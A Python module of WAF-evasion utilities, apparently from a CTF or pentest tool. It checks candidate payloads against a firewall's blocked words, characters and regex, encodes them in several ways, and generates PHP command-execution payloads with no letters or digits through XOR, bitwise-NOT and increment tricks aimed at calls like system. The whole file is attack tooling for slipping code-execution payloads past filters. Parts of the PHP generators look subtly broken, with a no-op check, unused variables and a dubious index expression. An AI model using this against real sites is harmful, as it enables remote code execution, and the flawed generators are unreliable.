import base64
import re
import urllib.parse


def parse_waf_words(waf_words: str):
    """
    解析 WAF 过滤词列表
    Parse WAF forbidden words list
    """
    if not waf_words:
        return []
    parts = [p.strip() for p in waf_words.split("|") if p.strip()]
    cleaned = []
    for token in parts:
        token = _strip_regex_delimiters(token)
        if token:
            cleaned.append(token)
    return cleaned


def parse_waf_chars(waf_chars: str):
    """
    解析 WAF 过滤字符集
    Parse WAF forbidden characters set
    """
    if not waf_chars:
        return set()
    return {ch for ch in waf_chars if not ch.isspace()}


def parse_waf_regex(waf_regex: str):
    """
    解析 WAF 正则表达式
    Parse WAF regular expression
    """
    if not waf_regex:
        return None
    pattern = waf_regex.strip()
    flags = 0
    if pattern.startswith("/") and pattern.count("/") >= 2:
        last = pattern.rfind("/")
        flag_str = pattern[last + 1 :]
        pattern = pattern[1:last]
        flags |= _parse_regex_flags(flag_str)
    try:
        return re.compile(pattern, flags)
    except re.error:
        return None


def dedupe_preserve_order(items):
    """
    保持顺序去重
    Deduplicate list while preserving order
    """
    seen = set()
    result = []
    for item in items:
        if item in seen:
            continue
        seen.add(item)
        result.append(item)
    return result


def is_payload_allowed(payload: str, waf_words, waf_chars, waf_regex, limit_length: int):
    """
    检查 Payload 是否被 WAF 允许
    Check if payload is allowed by WAF
    """
    if limit_length is not None and len(payload) > limit_length:
        return False
    if waf_words:
        lower_payload = payload.lower()
        for word in waf_words:
            if word and word.lower() in lower_payload:
                return False
    if waf_chars:
        for ch in payload:
            if ch in waf_chars:
                return False
    if waf_regex and waf_regex.search(payload):
        return False
    return True


def url_encode(payload: str):
    """
    URL 编码
    URL encoding
    """
    return urllib.parse.quote(payload, safe="")


def double_url_encode(payload: str):
    """
    双重 URL 编码
    Double URL encoding
    """
    return urllib.parse.quote(url_encode(payload), safe="")


def unicode_escape_encode(payload: str):
    """
    Unicode 转义编码
    Unicode escape encoding
    """
    return "".join("\\u%04x" % ord(ch) for ch in payload)


def hex_escape_encode(payload: str):
    """
    十六进制转义编码
    Hex escape encoding
    """
    return "".join("\\x%02x" % ord(ch) for ch in payload)


def octal_escape_encode(payload: str):
    """
    八进制转义编码
    Octal escape encoding
    """
    return "".join("\\%03o" % ord(ch) for ch in payload)


def base64_encode(payload: str):
    """
    Base64 编码
    Base64 encoding
    """
    data = payload.encode("utf-8")
    return base64.b64encode(data).decode("ascii")


def generate_php_xor(text: str):
    """
    生成 PHP 异或 Payload (无字母数字)
    Generate PHP XOR Payload (No Alphanumeric)
    Format: ('%xx'^'%xx')...
    """
    xor_str1 = ""
    xor_str2 = ""
    for char in text:
        found = False
        # 寻找两个非字母数字字符，使得它们异或的结果等于 char
        # Find two non-alphanumeric chars that XOR to char
        for i in range(256):
            if found:
                break
            c1 = chr(i)
            if c1.isalnum():
                continue
            for j in range(256):
                c2 = chr(j)
                if c2.isalnum():
                    continue
                if (ord(c1) ^ ord(c2)) == ord(char):
                    xor_str1 += "%" + hex(i)[2:].zfill(2)
                    xor_str2 += "%" + hex(j)[2:].zfill(2)
                    found = True
                    break
    if len(xor_str1) // 3 != len(text):
        return None  # Failed to find combination
    return f"('{xor_str1}'^'{xor_str2}')"


def generate_php_not(text: str):
    """
    生成 PHP 取反 Payload
    Generate PHP Bitwise NOT Payload
    Format: ~%xx%xx...
    """
    not_str = ""
    for char in text:
        byte_val = ord(char)
        not_val = (~byte_val) & 0xFF
        not_char = chr(not_val)
        if not_char.isalnum():
            pass
        not_str += "%" + hex(not_val)[2:].zfill(2)
    return f"(~'{not_str}')"


def generate_php_increment(text: str):
    """
    生成 PHP 自增 Payload
    Generate PHP Increment Payload (No Alphanumeric)
    """

    payload = "$_=[].'';"  # $_ = "Array"
    variables = {} # char -> variable name
    
    code_parts = []
    code_parts.append("$_=[].''") # "Array"
    
    if not text.isalpha():
        return None # 目前仅支持纯字母的命令，如 system, ls, cat 等
        
    # 定义 0 和 3 的无数字表示
    # 0: []!=[] (False)
    # 1: []==[] (True)
    # 3: (1+1+1)
    
    zero = "([]!=[])"
    one = "([]==[])"
    three = f"({one}+{one}+{one})"
    
    # 初始化代码
    # $a = "Array"
    # $b = 'A'
    # $c = 'a'
    init = "$_=[].'';$b=$_[%s];$c=$_[%s];" % (zero, three)
    
    # 构建目标字符串

    res_var = "$_____"
    iter_var = "$____"
    
    parts = [
        "$_=[].''",     
        "$__=$_[[]!=[]]", 
        "$___=$_[[]==[]+[]==[]+[]==[]]", 
        f"{res_var}=_"
    ]
    
    parts.pop() 
    parts.append(f"{res_var}=''") # $_____ = ""
    
    for char in text:
        if 'A' <= char <= 'Z':
            base = 'A'
            base_var = "$__"
        else:
            base = 'a'
            base_var = "$___"
            
        diff = ord(char) - ord(base)
        
        # $iter = $base;
        parts.append(f"{iter_var}={base_var}")
        
        # ++$iter diff times
        if diff > 0:
            parts.append(f"{iter_var}++"*diff)
            
        # $res .= $iter
        parts.append(f"{res_var}.={iter_var}")
    
    return ";".join(parts)


def _split_string_to_vars(text: str):
    """
    随机拆分字符串并分配给随机变量
    Randomly split string and assign to random variables
    Returns: (assignment_str, concatenation_str)
    """
    import random
    import string

    if not text:
        return "", ""

    # Generate random split points
    length = len(text)
    if length == 1:
        splits = [text]
    else:
        # Split into 2-4 parts randomly
        num_parts = random.randint(2, min(length, 4))
        # Create random split indices
        indices = sorted(random.sample(range(1, length), num_parts - 1))
        indices = [0] + indices + [length]
        
        splits = []
        for i in range(len(indices) - 1):
            splits.append(text[indices[i]:indices[i+1]])

    # Assign to random variables
    assignments = []
    vars_used = []
    
    available_chars = string.ascii_lowercase
    
    for part in splits:
        var_name = random.choice(available_chars)
        while var_name in vars_used:
            var_name = random.choice(available_chars) + random.choice(available_chars)
        
        vars_used.append(var_name)
        assignments.append(f"{var_name}={part}")
    
    concat_str = "".join([f"${v}" for v in vars_used])
    assign_str = ";".join(assignments) + ";"
    
    return assign_str, concat_str


def get_encoding_strategies():
    """
    获取所有编码策略
    Get all encoding strategies
    Note: Some strategies return raw encoded strings, others return execution wrappers.
    """
    return [
        ("url", url_encode),
        ("double_url", double_url_encode),
        ("unicode_escape", unicode_escape_encode),
        ("hex_escape", hex_escape_encode),
        ("octal_escape", octal_escape_encode),
        ("raw", lambda s: s),
    ]


def _strip_regex_delimiters(token: str):
    """
    剥离正则表达式定界符
    Strip regex delimiters
    """
    token = token.strip()
    if token.startswith("/") and token.endswith("/"):
        return token[1:-1]
    if token.startswith("/") and token.count("/") >= 2:
        last = token.rfind("/")
        return token[1:last]
    lower = token.lower()
    if lower.endswith("/i") or lower.endswith("/s") or lower.endswith("/m"):
        return token[:-2]
    if lower.endswith("/is") or lower.endswith("/im") or lower.endswith("/sm"):
        return token[:-3]
    return token


def _parse_regex_flags(flag_str: str):
    """
    解析正则表达式标志
    Parse regex flags
    """
    flags = 0
    for ch in flag_str:
        if ch == "i":
            flags |= re.IGNORECASE
        elif ch == "s":
            flags |= re.DOTALL
        elif ch == "m":
            flags |= re.MULTILINE
    return flags
